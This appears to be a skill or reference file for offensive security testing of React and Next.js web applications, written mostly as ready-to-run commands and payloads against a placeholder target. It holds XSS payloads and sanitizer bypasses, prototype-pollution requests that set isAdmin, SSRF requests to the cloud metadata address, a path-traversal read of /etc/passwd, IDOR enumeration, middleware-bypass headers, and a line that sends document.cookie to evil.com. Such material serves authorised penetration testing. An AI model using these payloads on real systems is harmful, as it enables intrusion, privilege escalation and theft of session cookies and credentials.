---
name: react
description: React framework security testing - XSS, prototype pollution, DOM manipulation, and client-side attacks
---

# React Framework Attacks

## Fingerprinting

### Identify React
```bash
# Check for React markers
curl -s https://target.com | grep -i "react\|__NEXT_DATA__\|_next/static"

# Check JavaScript files
curl -s https://target.com/static/js/main.js | grep -i "react\|reactdom"

# Check for React Developer Tools
# In browser console:
# window.__REACT_DEVTOOLS_GLOBAL_HOOK__
```

### Next.js Detection
```bash
# Check for Next.js specific paths
curl -s https://target.com/_next/data/
curl -s https://target.com/_next/static/

# Check for __NEXT_DATA__
curl -s https://target.com | grep -o '__NEXT_DATA__'
```

## Common Vulnerabilities

### 1. XSS via dangerouslySetInnerHTML

**Vulnerable pattern**
```javascript
// Vulnerable: using dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: userInput}}></div>

// Test payload
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

**Bypass sanitization**
```javascript
// If using DOMPurify, test for bypass
<img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

### 2. Prototype Pollution

**React-specific vectors**
```javascript
// Test in browser console
Object.prototype.polluted = true

// Check if React components are affected
document.querySelector('[data-reactroot]').__proto__.polluted

// Test for prototype pollution via URL parameters
https://target.com/?__proto__[polluted]=true
https://target.com/?constructor[prototype][polluted]=true
```

**Server-side prototype pollution (Next.js)**
```bash
# Test for server-side prototype pollution
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'

curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'
```

### 3. Server-Side Rendering (SSR) Vulnerabilities

**Next.js SSRF**
```bash
# Test for SSRF in getServerSideProps
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"

# Test for path traversal
curl "https://target.com/api/file?path=../../../../etc/passwd"
```

**Next.js API route vulnerabilities**
```bash
# Check for exposed API routes
curl -s https://target.com/api/
curl -s https://target.com/api/users
curl -s https://target.com/api/admin

# Test for IDOR
curl https://target.com/api/users/1
curl https://target.com/api/users/2
curl https://target.com/api/users/admin
```

### 4. Client-Side Template Injection

**React template literals**
```javascript
// Vulnerable: using eval or Function constructor
const userInput = "alert(1)";
eval(`const result = ${userInput}`);
new Function(`return ${userInput}`)();

// Test payload
alert(1)
fetch('https://evil.com/?c='+document.cookie)
```

### 5. Open Redirects

**React Router vulnerabilities**
```bash
# Test for open redirect
https://target.com/redirect?url=https://evil.com
https://target.com/login?redirect=https://evil.com
https://target.com/logout?returnTo=https://evil.com

# Next.js specific
https://target.com/api/auth/callback?callbackUrl=https://evil.com
```

### 6. Sensitive Data Exposure

**Check for exposed data**
```bash
# Check __NEXT_DATA__ for sensitive information
curl -s https://target.com | grep -o '__NEXT_DATA__.*</script>' | jq '.props.pageProps'

# Check for exposed environment variables
curl -s https://target.com/_next/static/chunks/pages/_app.js | grep -iE "(api[_-]?key|token|secret)"

# Check for source maps
curl -s https://target.com/static/js/main.js.map
curl -s https://target.com/_next/static/chunks/main.js.map
```

## Attack Techniques

### 1. CSP Bypass

**React-specific CSP bypass**
```javascript
// If CSP allows unsafe-inline
<script>
  const script = document.createElement('script');
  script.textContent = 'alert(1)';
  document.body.appendChild(script);
</script>

// If CSP allows unsafe-eval
<script>
  eval('alert(1)');
</script>
```

### 2. State Manipulation

**Redux/MobX state manipulation**
```javascript
// In browser console
// Manipulate Redux store
window.__REDUX_DEVTOOLS_EXTENSION__.dispatch({type: 'SET_ADMIN', payload: true})

// Manipulate MobX store
window.__MOBX_DEVTOOLS_GLOBAL_HOOK__.stores[0].isAdmin = true
```

### 3. Route Protection Bypass

**Client-side route protection bypass**
```javascript
// In browser console
// Manipulate React Router
window.history.pushState({}, '', '/admin')

// Manipulate authentication state
localStorage.setItem('isAuthenticated', 'true')
localStorage.setItem('user', JSON.stringify({isAdmin: true}))
```

### 4. Dependency Confusion

**Check for vulnerable dependencies**
```bash
# Check package.json
curl -s https://target.com/package.json | jq '.dependencies'

# Look for known vulnerable packages
# - lodash < 4.17.21 (prototype pollution)
# - react < 16.0.0 (XSS)
# - next < 12.0.0 (SSRF)
# - axios < 0.21.1 (SSRF)
```

## Next.js Specific Attacks

### 1. API Route Vulnerabilities
```bash
# Enumerate API routes
curl -s https://target.com/api/
curl -s https://target.com/api/auth/
curl -s https://target.com/api/graphql

# Test for common vulnerabilities
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@target.com", "password": "password123"}'
```

### 2. Middleware Bypass
```bash
# Test for middleware bypass
curl -H "x-middleware-subrequest: bypass" https://target.com/admin
curl -H "x-invoke-path: /admin" https://target.com/admin
```

### 3. Image Optimization SSRF
```bash
# Test for SSRF in Next.js image optimization
curl "https://target.com/_next/image?url=http://169.254.169.254/latest/meta-data/&w=100&q=100"
```

## Testing Checklist

- [ ] Identify React/Next.js version
- [ ] Test for XSS via dangerouslySetInnerHTML
- [ ] Test for prototype pollution (client and server-side)
- [ ] Test for SSR vulnerabilities (Next.js)
- [ ] Test for IDOR in API routes
- [ ] Check for exposed __NEXT_DATA__
- [ ] Check for source maps
- [ ] Test for open redirects
- [ ] Test CSP configuration
- [ ] Check for vulnerable dependencies
- [ ] Test Next.js middleware bypass
- [ ] Test Next.js image optimization SSRF

## Tools

```bash
# Retire.js for dependency scanning
retire --path /path/to/react/app

# Nuclei templates for React/Next.js
nuclei -u https://target.com -t ~/nuclei-templates/technologies/react/
nuclei -u https://target.com -t ~/nuclei-templates/technologies/nextjs/

# Source map parser
npm install -g source-map-explorer
source-map-explorer main.js.map
```
